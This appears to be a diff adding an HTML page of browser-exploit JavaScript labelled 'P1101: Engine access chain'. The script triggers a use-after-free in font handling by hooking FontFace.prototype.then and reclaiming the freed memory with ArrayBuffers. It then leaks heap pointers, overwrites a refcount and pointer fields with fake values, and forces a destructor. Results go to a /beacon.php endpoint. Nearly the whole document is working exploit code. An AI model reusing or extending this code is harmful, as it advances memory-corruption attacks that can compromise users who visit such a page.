@@ -1,0 +1,379 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1101</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:13px/1.6 monospace;padding:16px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+.crit{color:#f00;font-weight:bold;font-size:14px}
+.win{color:#0f0;font-weight:bold;font-size:15px}
+.phase{color:#fff;font-size:14px;font-weight:bold;margin:8px 0}
+#prog{height:4px;background:#222;margin:8px 0;border-radius:2px}
+#bar{height:100%;background:#6f6;border-radius:2px;width:0%;transition:width 0.3s}
+</style>
+</head><body>
+<h2 style="color:#fff;font-size:16px;margin-bottom:4px">P1101: Engine access chain — make engine follow our controlled pointers</h2>
+<div id="prog"><div id="bar"></div></div>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log'),bar=document.getElementById('bar');
+function log(cls,msg){var d=document.createElement('div');d.className=cls;d.textContent=msg;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(tag,data){try{new Image().src='/beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+B('P1101-BOOT','');
+
+// ============================================================
+// Phase 1: Establish UAF (proven P1100v2 trigger)
+// ============================================================
+var styleEl=null,firedHere=false,map=null,hitEntry=null,hitIdx=-1;
+var cssRuleRef=null,fontFaceA=null;
+
+fontFaceA=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(fontFaceA);
+void fontFaceA.loaded;
+styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+
+firedHere=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedHere)return undefined;
+    firedHere=true;
+    cssRuleRef=this;
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(sz);
+        map.push({size:sz,ab:ab,view:new Uint8Array(ab),idx:si*K+k});
+      }
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Poll ALL 192-byte buffers
+var patched=false,leakedPtrs=null,patchTime=0,b64ref=null;
+for(var t=15;t<=200;t+=5){
+  (function(ms){
+    setTimeout(function(){
+      if(patched||!map)return;
+      if(typeof BigUint64Array==='undefined')return;
+      for(var bi=32;bi<40;bi++){
+        if(!map[bi])continue;
+        var b64=new BigUint64Array(map[bi].ab);
+        var nz=0;
+        for(var qi=0;qi<b64.length;qi++)if(b64[qi]!==0n)nz++;
+        if(nz>0&&!patched){
+          patched=true;patchTime=ms;hitEntry=map[bi];hitIdx=bi;
+          b64ref=b64;
+          leakedPtrs=[];
+          for(var qi=0;qi<b64.length;qi++){
+            if(b64[qi]!==0n)leakedPtrs.push({off:qi*8,val:b64[qi]});
+          }
+          b64[0]=0x100n;
+          var pstr=leakedPtrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(',');
+          log('crit','PATCHED buf#'+bi+' at '+ms+'ms');
+          log('ptr',pstr);
+          B('P1101-PATCH','buf='+bi+'|ms='+ms+'|'+pstr);
+          bar.style.width='15%';
+        }
+      }
+    },ms);
+  })(t);
+}
+
+// ============================================================
+// Phase 2: Engine access tests (deferred 800ms after trigger)
+// ============================================================
+setTimeout(function(){
+  if(!patched||!hitEntry){
+    // Fallback scan
+    for(var i=0;i<map.length;i++){
+      var v=map[i].view;var nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0&&map[i].size===192){
+        hitEntry=map[i];hitIdx=i;patched=true;
+        b64ref=new BigUint64Array(map[i].ab);
+        b64ref[0]=0x100n;
+        B('P1101-LATE','buf='+i);break;
+      }
+    }
+    if(!patched){B('P1101-NOHIT','');return;}
+  }
+
+  log('ok','Stable. Starting engine access tests...');
+  bar.style.width='20%';
+
+  // Helper: snapshot and diff
+  function snapBuf(){
+    var s=[];for(var qi=0;qi<b64ref.length;qi++)s.push(b64ref[qi]);return s;
+  }
+  function diffBuf(snap,label){
+    var changes=[];
+    for(var qi=0;qi<b64ref.length;qi++){
+      if(b64ref[qi]!==snap[qi])
+        changes.push('+'+hex(qi*8)+':'+hex(snap[qi])+'->'+hex(b64ref[qi]));
+    }
+    if(changes.length>0){
+      log('crit',label+' MODIFIED buffer: '+changes.join(', '));
+      B('P1101-'+label,changes.join(','));
+      return true;
+    }
+    log('info',label+' — no buffer changes');
+    return false;
+  }
+
+  // Dump full buffer state
+  log('','');
+  log('phase','Full buffer dump (24 qwords):');
+  var fullDump=[];
+  for(var qi=0;qi<b64ref.length;qi++){
+    var v=b64ref[qi];
+    var mark='';
+    if(qi===0)mark=' [refcount=0x100]';
+    else if(v!==0n&&v>0x100000000n&&v<0x800000000000n)mark=' [HEAP PTR]';
+    else if(v!==0n)mark=' [data]';
+    if(v!==0n)log('ptr','  +'+hex(qi*8)+' = '+hex(v)+mark);
+    fullDump.push(hex(v));
+  }
+  B('P1101-DUMP',fullDump.join(',').substring(0,600));
+
+  // ============================================================
+  // Test A: Re-add CSS @font-face with same family name "s0"
+  // ============================================================
+  setTimeout(function(){
+    log('','');
+    log('phase','Test A: Re-add CSS @font-face s0');
+    var snap=snapBuf();
+
+    var se2=document.createElement('style');
+    se2.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(se2);
+    document.body.offsetHeight; // force style recalc
+
+    setTimeout(function(){
+      var changed=diffBuf(snap,'TEST-A-READD');
+      bar.style.width='30%';
+
+      // ============================================================
+      // Test B: Render text with font-family s0
+      // ============================================================
+      log('','');
+      log('phase','Test B: Render text with font-family s0');
+      snap=snapBuf();
+
+      var el=document.createElement('div');
+      el.style.fontFamily='s0, serif';
+      el.style.fontSize='48px';
+      el.textContent='BBBBB';
+      document.body.appendChild(el);
+      var w1=el.offsetWidth;
+      var h1=el.offsetHeight;
+      log('info','Text dimensions: '+w1+'x'+h1);
+
+      setTimeout(function(){
+        diffBuf(snap,'TEST-B-RENDER');
+        bar.style.width='40%';
+
+        // Also try getBoundingClientRect
+        snap=snapBuf();
+        var rect=el.getBoundingClientRect();
+        log('info','BoundingClientRect: '+rect.width.toFixed(2)+'x'+rect.height.toFixed(2));
+        diffBuf(snap,'TEST-B-RECT');
+
+        // ============================================================
+        // Test C: fonts.check / fonts.load with s0
+        // ============================================================
+        log('','');
+        log('phase','Test C: document.fonts API with s0');
+        snap=snapBuf();
+
+        try{
+          var chk=document.fonts.check('48px s0','B');
+          log('info','fonts.check("48px s0") = '+chk);
+        }catch(e){log('fail','fonts.check threw: '+e.message);}
+
+        diffBuf(snap,'TEST-C-CHECK');
+
+        // fonts.forEach
+        snap=snapBuf();
+        var fontList=[];
+        try{
+          document.fonts.forEach(function(ff){
+            fontList.push(ff.family+'/'+ff.status);
+          });
+          log('info','document.fonts: ['+fontList.join(', ')+']');
+        }catch(e){log('fail','fonts.forEach threw: '+e.message);}
+        diffBuf(snap,'TEST-C-FOREACH');
+        B('P1101-FONTS',fontList.join(','));
+
+        bar.style.width='50%';
+
+        // ============================================================
+        // Test D: Measure text with different methods
+        // ============================================================
+        setTimeout(function(){
+          log('','');
+          log('phase','Test D: Canvas measureText with s0');
+          snap=snapBuf();
+
+          try{
+            var c=document.createElement('canvas');
+            var ctx=c.getContext('2d');
+            ctx.font='48px s0';
+            var m=ctx.measureText('BBBBB');
+            log('info','Canvas measureText: width='+m.width.toFixed(2));
+          }catch(e){log('fail','Canvas measureText threw: '+e.message);}
+
+          diffBuf(snap,'TEST-D-CANVAS');
+          bar.style.width='60%';
+
+          // ============================================================
+          // Test E: Write fake pointers, force font re-resolution
+          // ============================================================
+          log('','');
+          log('phase','Test E: Modify +0x58 pointer, trigger font resolution');
+
+          // Save original pointer values
+          var orig58=b64ref[0x58/8];
+          var orig68=b64ref[0x68/8];
+          log('info','Original +0x58='+hex(orig58)+', +0x68='+hex(orig68));
+
+          // Write a distinctive marker at +0x58
+          snap=snapBuf();
+          b64ref[0x58/8]=0xDEADBEEFCAFEn;
+          log('info','Wrote +0x58=0xDEADBEEFCAFE');
+
+          // Try to trigger font resolution that reads +0x58
+          try{document.fonts.check('48px s0','B');}catch(e){}
+          el.style.fontSize='96px';
+          document.body.offsetHeight;
+          try{
+            var c2=document.createElement('canvas');
+            var ctx2=c2.getContext('2d');
+            ctx2.font='96px s0';
+            ctx2.measureText('BBBBB');
+          }catch(e){}
+
+          // Check if engine read/wrote +0x58 (changed our marker)
+          var cur58=b64ref[0x58/8];
+          if(cur58!==0xDEADBEEFCAFEn){
+            log('crit','ENGINE MODIFIED +0x58! Was 0xDEADBEEFCAFE, now '+hex(cur58));
+            B('P1101-58-MOD','was=0xDEADBEEFCAFE|now='+hex(cur58));
+          }else{
+            log('info','+0x58 marker intact — engine did not access it');
+          }
+
+          // Restore original
+          b64ref[0x58/8]=orig58;
+          b64ref[0x68/8]=orig68;
+          bar.style.width='70%';
+
+          // ============================================================
+          // Test F: Controlled destructor — set refcount=1, then deref
+          // ============================================================
+          setTimeout(function(){
+            log('','');
+            log('phase','Test F: Controlled destructor test');
+            log('info','Setting refcount=1 and triggering GC...');
+            snap=snapBuf();
+
+            // Set refcount to 1
+            b64ref[0]=1n;
+
+            // GC pressure to trigger destructor
+            var g=[];
+            for(var i=0;i<10000;i++)g.push(new ArrayBuffer(1000));
+            g=null;
+
+            // Force layout
+            document.body.offsetHeight;
+
+            // Small delay then check
+            setTimeout(function(){
+              var alive=true;
+              try{
+                var test=b64ref[0];
+                log('ok','Process alive after refcount=1 + GC');
+                log('ptr','refcount now: '+hex(b64ref[0]));
+
+                // Check ALL changes
+                var fChanges=[];
+                for(var qi=0;qi<b64ref.length;qi++){
+                  if(b64ref[qi]!==snap[qi])
+                    fChanges.push('+'+hex(qi*8)+':'+hex(snap[qi])+'->'+hex(b64ref[qi]));
+                }
+                if(fChanges.length>0){
+                  log('crit','Destructor MODIFIED buffer: '+fChanges.join(', '));
+                  B('P1101-DESTR',fChanges.join(','));
+                }else{
+                  log('info','No destructor ran (refcount=1 not decremented by GC)');
+                  B('P1101-DESTR-NOOP','rc='+hex(b64ref[0]));
+                }
+              }catch(e){
+                log('fail','Access failed after destructor: '+e.message);
+                B('P1101-DESTR-CRASH',e.message);
+              }
+
+              // Restore refcount high for safety
+              try{b64ref[0]=0x100n;}catch(e){}
+              bar.style.width='85%';
+
+              // ============================================================
+              // Test G: delete fonts.delete + re-add to trigger internal lookup
+              // ============================================================
+              setTimeout(function(){
+                log('','');
+                log('phase','Test G: Re-add f0 to document.fonts');
+                snap=snapBuf();
+
+                // Re-add the original FontFace A
+                try{
+                  document.fonts.add(fontFaceA);
+                  log('ok','Re-added fontFaceA');
+                }catch(e){log('fail','Re-add threw: '+e.message);}
+
+                // Check
+                try{document.fonts.check('1em f0','A');}catch(e){}
+                document.body.offsetHeight;
+
+                setTimeout(function(){
+                  diffBuf(snap,'TEST-G-READD');
+
+                  // Remove again
+                  try{document.fonts.delete(fontFaceA);}catch(e){}
+
+                  bar.style.width='100%';
+                  log('','');
+                  log('phase','=== P1101 Summary ===');
+                  log('win','UAF established: buf#'+hitIdx+' at '+patchTime+'ms');
+                  log('info','Leaked ptrs: '+leakedPtrs.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));
+                  log('info','All engine access tests completed');
+                  B('P1101-DONE','buf='+hitIdx+'|ms='+patchTime);
+                },500);
+              },200);
+            },500);
+          },300);
+        },200);
+      },100);
+    },100);
+  },300);
+},800);
+</script>
+</body></html>
